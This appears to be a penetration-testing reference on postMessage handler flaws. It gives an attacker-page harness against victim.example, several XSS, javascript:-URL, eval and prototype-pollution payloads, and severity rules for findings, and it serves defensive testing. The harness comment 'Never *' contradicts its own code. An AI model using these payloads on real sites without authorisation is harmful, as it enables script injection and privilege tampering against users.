# postMessage payloads

Targets: any `addEventListener("message", ...)` / `onmessage` handler that
fails to validate `event.origin` or `event.data`.

## The exploit harness (attacker page)

```html
<script>
  const target = window.open("https://victim.example/app");
  // Never '*': the test payload must go where the app can hear it.
  target.postMessage({type: "SET_STATE", payload: "</script><img src=x onerror=alert(1)>"}, "*");
</script>
```

If the app's handler does not check `event.origin`, this fires regardless of
who sent it. Also try `window.opener.postMessage(...)` from a page the app
opened.

## Payload variations to try

Message-shaped (match the app's expected envelope — read the handler first):

```js
{type: "SET_STATE", payload: "..."}
{action: "navigate", url: "javascript:alert(1)"}
{command: "eval", code: "alert(1)"}
```

Raw (if the handler uses `event.data` directly as a string):

```
</script><img src=x onerror=alert(1)>
{"__proto__":{"isAdmin":true}}
```

## What counts as a finding

- Missing origin check → CRITICAL (any origin can post). Test by posting
  from a page on a *different* origin.
- Origin checked but `event.data` unvalidated → WARNING/CRITICAL per what the
  payload can reach (DOM, storage, state).
- Checking `event.source` but not `event.origin` → still vulnerable to nested
  iframes; both must be validated.

## Fix reference

See `fixes/postmessage.md` for the safe handler and safe send pattern.
